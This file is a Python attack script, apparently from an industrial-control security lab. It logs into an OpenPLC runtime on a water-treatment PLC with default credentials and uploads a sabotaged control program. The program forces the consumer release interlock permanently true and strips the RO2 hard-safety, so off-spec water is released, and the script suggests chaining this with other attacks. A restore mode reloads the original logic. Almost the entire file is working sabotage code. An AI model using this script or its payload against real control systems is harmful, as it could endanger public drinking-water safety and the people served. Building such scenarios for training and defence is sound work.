#!/usr/bin/env python3
"""Scenario 9, replace the running control program on plc-water.

The OpenPLC runtime UI accepts a program upload while the keyswitch is in
REMOTE. This pushes a control(io) module that forces the release interlock
("Release to Consumers") permanently true and drops the RO2 hard-safety, so
off-spec DI water is released to the consumers with nothing to stop it.

  push_logic_water.py            upload the attacker program
  push_logic_water.py restore    upload the golden program back
"""
import base64
import sys
import urllib.request

import targets as T

URL = f"http://{T.guard(T.PLC_WATER)}:{T.HTTP_PORT}/upload-program"
AUTH = "Basic " + base64.b64encode(b"openplc:openplc").decode()

ATTACKER = b'''PROGRAM_NAME = "crosscreek_ro_v1_PATCHED"
def control(io):
    cip = io.seq_cip or io.seq_sanitise
    if not io.ro_valves_hand:
        if io.di_tank_pct <= io.tank_lo_sp:
            io.seq_ro = True
        elif io.di_tank_pct >= io.tank_hi_sp:
            io.seq_ro = False
        if cip:
            io.seq_ro = False
    if not io.p102_hand:
        io.p102_feed = io.seq_ro and not cip
    if not io.p101_hand:
        io.p101_antiscalant = io.p102_feed and io.antiscalant_tank_pct > 2.0
    if not io.p301_hand:
        io.p301_ro1 = io.p102_feed and io.feed_press_bar > 1.0
    if not io.p302_hand:
        io.p302_ro2 = io.p301_ro1              # RO2 hard-safety removed
    if not io.loop_valves_hand:
        io.seq_loop = True
    if not io.p401_hand:
        io.p401_loop = io.seq_loop
    if not io.uv_hand:
        io.uv401 = io.seq_loop
    io.release_ok = True                          # release interlock defeated
'''

GOLDEN = b'''PROGRAM_NAME = "crosscreek_ro_v1 (golden)"
def control(io):
    cip = io.seq_cip or io.seq_sanitise
    if not io.ro_valves_hand:
        if io.di_tank_pct <= io.tank_lo_sp:
            io.seq_ro = True
        elif io.di_tank_pct >= io.tank_hi_sp:
            io.seq_ro = False
        if cip:
            io.seq_ro = False
    if not io.p102_hand:
        io.p102_feed = io.seq_ro and not cip
    if not io.p101_hand:
        io.p101_antiscalant = io.p102_feed and io.antiscalant_tank_pct > 2.0
    if not io.p301_hand:
        io.p301_ro1 = io.p102_feed and io.feed_press_bar > 1.0
    if not io.p302_hand:
        io.p302_ro2 = io.p301_ro1 and io.ro1_cond_us < 50.0
    if io.ro2_cond_us > io.cond_hard_limit and not io.bypass_release_ilk:
        io.p302_ro2 = False
    if not io.loop_valves_hand:
        io.seq_loop = True
    if not io.p401_hand:
        io.p401_loop = io.seq_loop
    if not io.uv_hand:
        io.uv401 = io.seq_loop
    quality_ok = (io.ro2_cond_us <= io.cond_limit_us
                  and io.loop_ret_cond_us <= io.cond_limit_us
                  and io.uv_intensity_pct >= io.uv_min_intensity
                  and io.di_tank_pct > 10.0)
    io.release_ok = quality_ok or io.bypass_release_ilk
'''


def upload(blob, label):
    boundary = "----ccx"
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"program\"; "
        f"filename=\"{label}.py\"\r\nContent-Type: text/x-python\r\n\r\n"
    ).encode() + blob + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(URL, data=body, headers={
        "Authorization": AUTH,
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    })
    with urllib.request.urlopen(req, timeout=5) as r:
        print(r.read().decode("utf-8", "replace"))


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "restore":
        upload(GOLDEN, "golden")
    else:
        upload(ATTACKER, "patched")
        print("Release is now forced true. Pair with starve-antiscalant or the")
        print("CIP logic push and off-spec water reaches the point of use.")
        print("Prefer ./reset.sh for a full restore.")
